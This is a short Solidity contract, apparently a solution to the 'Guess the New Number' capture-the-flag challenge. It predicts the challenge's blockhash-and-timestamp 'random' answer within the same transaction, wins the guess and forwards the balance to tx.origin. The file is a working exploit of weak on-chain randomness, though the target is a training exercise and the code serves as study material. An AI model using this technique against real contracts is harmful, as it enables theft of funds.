/**
 *Submitted for verification at Etherscan.io on 2021-11-12
*/

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge{
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}
contract GTNNCAttacker {
    IGuessTheNewNumberChallenge public challenge;

    function GTNNCAttacker(address challengeAddress) public payable {
        require(msg.value == 1 ether);
        challenge = IGuessTheNewNumberChallenge(challengeAddress);
    }

    function guessAttack() external payable {
          // simulate all steps the challenge contract does
        require(address(this).balance >= 1 ether);
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(1 ether)(answer);
        require(challenge.isComplete());

        tx.origin.transfer(address(this).balance);
    }
}